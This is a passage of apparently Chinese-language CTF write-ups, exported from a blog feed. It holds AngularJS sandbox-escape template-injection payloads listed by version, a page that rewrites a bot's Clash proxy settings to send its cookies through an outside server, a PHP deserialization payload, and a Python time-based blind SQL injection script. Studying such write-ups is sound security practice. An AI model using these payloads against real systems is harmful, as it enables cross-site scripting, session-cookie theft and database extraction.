class="comment">//1.2.24 - 1.2.29</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=<span class="string">&#x27;&#x27;</span>.valueOf;$eval(<span class="string">&quot;x=&#x27;\&quot;+(y=&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;)+eval(y)+\&quot;&#x27;&quot;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.0</span></span><br><span class="line">&#123;&#123;!ready &amp;&amp; (ready = <span class="literal">true</span>) &amp;&amp; (</span><br><span class="line">!call</span><br><span class="line">? $$watchers[<span class="number">0</span>].get(toString.constructor.prototype)</span><br><span class="line">: (a = apply) &amp;&amp;</span><br><span class="line">(apply = <span class="keyword">constructor</span>) &amp;&amp;</span><br><span class="line">(valueOf = call) &amp;&amp;</span><br><span class="line">(&#x27;&#x27;+&#x27;&#x27;.toString(</span><br><span class="line">&#x27;F = Function.prototype;&#x27; +</span><br><span class="line">&#x27;F.apply = F.a;&#x27; +</span><br><span class="line">&#x27;delete F.a;&#x27; +</span><br><span class="line">&#x27;delete F.valueOf;&#x27; +</span><br><span class="line">&#x27;alert(1);&#x27;</span><br><span class="line">))</span><br><span class="line">);&#125;&#125;</span><br><span class="line"></span><br><span class="line">//1.3.1 - 1.3.2</span><br><span class="line">&#123;&#123;</span><br><span class="line">&#123;&#125;[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].assign=[].join;</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=<span class="string">&#x27;&#x27;</span>.valueOf;</span><br><span class="line"> $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.3 - 1.3.18</span></span><br><span class="line">&#123;&#123;&#123;&#125;[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].assign=[].join;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;</span><br><span class="line"> $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>); &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.19</span></span><br><span class="line">&#123;&#123;</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:<span class="literal">false</span>,<span class="attr">valueOf</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].charAt=[].join;</span><br><span class="line"> $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.20</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.4.0 - 1.4.9</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.5.0 - 1.5.8</span></span><br><span class="line">&#123;&#123;x = &#123;<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;&#x27;</span>.constructor.prototype&#125;; x[<span class="string">&#x27;y&#x27;</span>].charAt=[].join;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;a=toString().constructor.prototype;a.charAt=a.trim;$eval(<span class="string">&#x27;a,alert(42),a&#x27;</span>)&#125;&#125;<span class="string">&#x27;);&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//1.5.9 - 1.5.11</span></span><br><span class="line"><span class="string">&#123;&#123;</span></span><br><span class="line"><span class="string"> c=&#x27;</span><span class="string">&#x27;.sub.call;b=&#x27;</span><span class="string">&#x27;.sub.bind;a=&#x27;</span><span class="string">&#x27;.sub.apply;</span></span><br><span class="line"><span class="string"> c.$apply=$apply;c.$eval=b;op=$root.$$phase;</span></span><br><span class="line"><span class="string"> $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString;</span></span><br><span class="line"><span class="string"> C=c.$apply(c);$root.$$phase=op;$root.$digest=od;</span></span><br><span class="line"><span class="string"> B=C(b,c,b);$evalAsync(&quot;</span></span><br><span class="line"><span class="string"> astNode=pop();astNode.type=&#x27;</span>UnaryExpression<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"> astNode.operator=&#x27;</span>(<span class="built_in">window</span>.X?void0:(<span class="built_in">window</span>.X=<span class="literal">true</span>,alert(<span class="number">1</span>)))+<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"> astNode.argument=&#123;type:&#x27;</span>Identifier<span class="string">&#x27;,name:&#x27;</span>foo<span class="string">&#x27;&#125;;</span></span><br><span class="line"><span class="string">&quot;);</span></span><br><span class="line"><span class="string"> m1=B($$asyncQueue.pop().expression,null,$root);</span></span><br><span class="line"><span class="string"> m2=B(C,null,m1);[].push.apply=m2;a=&#x27;</span><span class="string">&#x27;.sub;</span></span><br><span class="line"><span class="string"> $eval(&#x27;</span>a(b.c)<span class="string">&#x27;);[].push.apply=a;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>更加详细的可参考：<code>https://xz.aliyun.com/t/4638</code></p>
<p>本题在报告<code>Report</code>处可以提交<code>url</code>，我们可以通过提交⼀个平台<code>XSS</code>来实现对管理员的信息进行读取，发现在前端源码中引入了<code>angular.js</code>，并且<code>ng-app</code>是开启状态，因此就去找<code>angular.js</code>的<code>csti</code>的相关信息</p>
<p>然而本题的<code>angular.js</code>是<code>1.8.8</code>版本的，默认<code>1.6</code>以后<code>angular</code>项目组就关闭了沙盒，所以沙盒不用绕过，直接用<code>payload</code>打即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;constructor.constructor(&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>到这里就可以成功触发<code>xss</code></p>
<h1 id="scientific-adfree-networking"><a href="#scientific-adfree-networking" class="headerlink" title="scientific_adfree_networking"></a>scientific_adfree_networking</h1><p>这题主要看残灯师傅的解题过程，题目的总体思路</p>
<ol>
<li>在<code>report</code>的时候让<code>bot</code>访问我们<code>vps</code>的<code>html</code>文件</li>
<li>其中的<code>/logout?next=</code>实现任意跳转访问我们<code>vps</code>的<code>html</code>文件可以触发<code>js</code>代码</li>
<li><code>js</code>代码中写好<code>clash</code>代理的配置可以通过<code>external-controller</code>控制<code>api</code>来走自己的代理获取<code>cookie</code></li>
</ol>
<h2 id="clash代理"><a href="#clash代理" class="headerlink" title="clash代理"></a>clash代理</h2><p>题目中的浏览器使用的是<code>clash</code>代理，我们可以修改<code>clash</code>配置中的<code>external-controller</code>选项来指定<code>api</code>的位置，题目中的<code>api</code>的位置在<code>127.0.0.1:9090</code></p>
<p>总体的思路就是是修改<code>clash</code>的配置，让浏览器走我们的代理，然后再次访问<code>blog.tomswebsite.com:8888</code>，这样的话我们就能抓到<code>bot</code>登陆<code>blog.tomswebsite.com:8888</code> 的<code>cookie</code></p>
<p>这里修改的<code>clash</code>配置为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mixed-port: <span class="number">1080</span></span><br><span class="line">allow-lan: <span class="literal">false</span></span><br><span class="line">mode: Rule</span><br><span class="line">log-level: debug</span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies:</span><br><span class="line">  - name: <span class="string">&#x27;http&#x27;</span></span><br><span class="line">    type: http</span><br><span class="line">    server: <span class="number">159.75</span><span class="number">.23</span><span class="number">.54</span></span><br><span class="line">    port: <span class="number">20002</span></span><br><span class="line"></span><br><span class="line">proxy-groups:</span><br><span class="line">  - name: <span class="string">&#x27;jrxnm&#x27;</span></span><br><span class="line">    type: select</span><br><span class="line">    proxies:</span><br><span class="line">      - http</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line"> - IP-CIDR,<span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span>,jrxnm</span><br><span class="line"> - MATCH,jrxnm</span><br></pre></td></tr></table></figure>

<p>其中<code>159.75.23.54:20002</code>是自己的代理服务器</p>
<h2 id="http代理"><a href="#http代理" class="headerlink" title="http代理"></a>http代理</h2><p><code>HTTP</code> 代理存在两种形式</p>
<ul>
<li>第一种是 <code>RFC 7230 - HTTP/1.1: Message Syntax and Routing</code></li>
</ul>
<p>这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端，它就负责在两端之间来回传送 <code>HTTP</code> 报文</p>
<p>然后什么是正向代理和反向代理呢</p>
<p>正向代理：我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210906211610556.png" alt="image-20210906211610556"></p>
<p>反向代理：指以代理服务器来接受<code>internet</code>上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给<code>internet</code>上请求连接的客户端</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210906211623115.png" alt="image-20210906211623115"></p>
<ul>
<li>第二种是 <code>Tunneling TCP based protocols through Web proxy servers</code>（通过 Web 代理服务器用隧道方式传输基于 TCP 的协议）</li>
</ul>
<p><code>HTTP</code> 客户端通过 <code>CONNECT</code> 方法请求隧道代理创建一条到达任意目的服务器和端口的 <code>TCP</code> 连接，并对客户端和服务器之间的后继数据进行盲转发</p>
<p>最后，将两种代理的实现代码合二为一，就可以得到全功能的 <code>Proxy</code> 程序</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">cReq, cRes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = url.parse(cReq.url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> options = &#123;</span><br><span class="line">        hostname : u.hostname, </span><br><span class="line">        port     : u.port || <span class="number">80</span>,</span><br><span class="line">        path     : u.path,       </span><br><span class="line">        method     : cReq.method,</span><br><span class="line">        headers     : cReq.headers</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> pReq = http.request(options, <span class="function"><span class="keyword">function</span>(<span class="params">pRes</span>) </span>&#123;</span><br><span class="line">        cRes.writeHead(pRes.statusCode, pRes.headers);</span><br><span class="line">        pRes.pipe(cRes);</span><br><span class="line">    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        cRes.end();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    cReq.pipe(pReq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">cReq, cSock</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = url.parse(<span class="string">&#x27;http://&#x27;</span> + cReq.url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> pSock = net.connect(u.port, u.hostname, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        cSock.write(<span class="string">&#x27;HTTP/1.1 200 Connection Established\r\n\r\n&#x27;</span>);</span><br><span class="line">        pSock.pipe(cSock);</span><br><span class="line">    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        cSock.end();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    cSock.pipe(pSock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer()</span><br><span class="line">    .on(<span class="string">&#x27;request&#x27;</span>, request)</span><br><span class="line">    .on(<span class="string">&#x27;connect&#x27;</span>, connect)</span><br><span class="line">    .listen(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这里就是用来接收<code>cookie</code>的代理，这里需要往服务器<code>hosts</code>添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 blog.tomswebsite.com</span><br></pre></td></tr></table></figure>

<p>然后在本地<code>8888</code>端口进行<code>nc</code>的监听</p>
<h2 id="任意跳转"><a href="#任意跳转" class="headerlink" title="任意跳转"></a>任意跳转</h2><p>在<code>/logut?next=xxxx</code>是存在任意<code>url</code>跳转的，我们可以将 <code>/logout?next=</code> 设置成自己<code>vps</code>，提交反馈，让<code>bot</code>来访问我们的<code>vps</code>，当他来访问时，就触发了<code>js</code>代码的执行，让<code>bot</code>去请求<code>restful</code>接口，设置代理为我们<code>vps</code></p>
<p><code>payload</code>如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">sleep</span> (<span class="params">time</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, time));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setConfig</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        config = <span class="string">&#x27;&#123;&quot;payload&quot;:&quot;mixed-port: 1080\\nallow-lan: true\\nmode: Rule\\nlog-level: debug\\nexternal-controller: \&#x27;127.0.0.1:9090\&#x27;\\n\\nproxies:\\n  - name: \&#x27;http\&#x27;\\n    type: http\\n    server: 159.75.23.54\\n    port: 20002\\n\\nproxy-groups:\\n  - name: \&#x27;jrxnm\&#x27;\\n    type: select\\n    proxies:\\n      - http\\n\\nrules:\\n - IP-CIDR,127.0.0.0/8,jrxnm\\n - MATCH,jrxnm\\n&quot;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(config);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        fetch(<span class="string">&quot;http://127.0.0.1:9090/configs&quot;</span>, &#123;</span></span><br><span class="line"><span class="javascript">            method: <span class="string">&#x27;PUT&#x27;</span>, </span></span><br><span class="line"><span class="javascript">            headers: <span class="keyword">new</span> Headers(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line">        &#125;),</span><br><span class="line">            body: config, </span><br><span class="line"><span class="javascript">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> response.text();</span></span><br><span class="line"><span class="javascript">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;error&quot;</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        setConfig();</span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">300</span>);</span></span><br><span class="line"><span class="javascript">        location.href = <span class="string">&quot;http://blog.tomswebsite.com:8888&quot;</span>;</span></span><br><span class="line">    &#125;)();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后拿接收到的<code>cookie</code>解密之后登录即可获取<code>flag</code></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>第五空间 2021</title>
    <url>/2021/09/17/2021%20%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p>记录一下<a id="more"></a></p>
<h2 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h2><p><code>/readme/mytz.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;act&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;act&#x27;</span>] == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">	phpinfo();</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有个探针页面，搜一下就有<code>flag</code></p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210916224646064-16318077110751.png" alt="image-20210916224646064"></p>
<h2 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $cinder;  </span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $logData; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cinder;</span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker;</span><br><span class="line">&#125;</span><br><span class="line">$ace = <span class="keyword">new</span> ace();</span><br><span class="line">$acp = <span class="keyword">new</span> acp();</span><br><span class="line">$abc =  serialize($acp);</span><br><span class="line">$ace-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$ace-&gt;docker = $abc;</span><br><span class="line">$acp-&gt;cinder = $ace;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($acp));</span><br></pre></td></tr></table></figure>

<h2 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params">$mes,$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,$s))&#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $username=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">        alertMes(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] === $password) &#123;</span><br><span class="line">    <span class="keyword">die</span>($FLAG);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alertMes(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一开始发现可以时间盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.115.143.25:32770&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),&#123;&#125;,1)) like &#123;&#125;),(select benchmark(4999999,md5(&#x27;test&#x27;))),1)#&quot;</span>.format(</span><br><span class="line">            num,i)</span><br><span class="line">        payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.post(url=url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">            print(<span class="string">&#x27;[+] &#x27;</span>+str(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-] &#x27;</span>+str(i))</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> (sec &gt; <span class="number">3</span>):</span><br><span class="line">            flag += chr(i)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>但是注入之后发现<code>user</code>是空表，用<code>quine</code></p>
